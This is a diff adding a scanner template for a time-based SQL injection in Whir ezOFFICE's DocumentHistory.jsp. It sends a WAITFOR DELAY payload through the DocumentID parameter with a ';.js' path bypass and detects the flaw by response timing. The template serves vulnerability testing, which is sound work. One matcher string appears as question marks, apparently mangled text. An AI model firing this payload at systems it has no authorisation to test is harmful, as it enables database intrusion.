@@ -1,0 +1,44 @@
+id: poc-yaml-whir-ezoffice-documenthistory-sqli
+info:
+  name: 万户 ezOFFICE DocumentHistory SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - id: check-redirect
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "/defaultroot"
+
+  - id: sqli-document-history
+    method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/public/iSignatureHTML.jsp/DocumentHistory.jsp;.js?DocumentID=1%27%20WAITFOR%20DELAY%20%270:0:{{t1}}%27--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "iSignature"
+          - "??????"
+          - "TDTitleStyle"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1) && duration < to_number(t2)"
